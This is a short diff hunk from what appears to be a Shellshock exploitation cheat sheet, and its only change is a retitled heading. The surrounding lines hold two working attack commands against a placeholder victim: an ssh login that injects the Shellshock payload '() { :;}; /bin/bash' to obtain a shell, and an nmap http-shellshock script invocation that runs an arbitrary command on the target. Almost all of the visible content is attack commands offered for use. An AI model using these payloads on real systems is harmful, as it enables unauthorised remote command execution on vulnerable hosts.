@@ -15,7 +15,7 @@
 ```
 ssh username@$[victim_ip] '() { :;}; /bin/bash'
 ```
-### nmap
+### Shellshock exploitaion with nmap script
 ```
 nmap --script -p [victim_port] http-shellshock --script-args uri=[/vuln/path] cmd=[yours_command] [victim_ip]
 ```
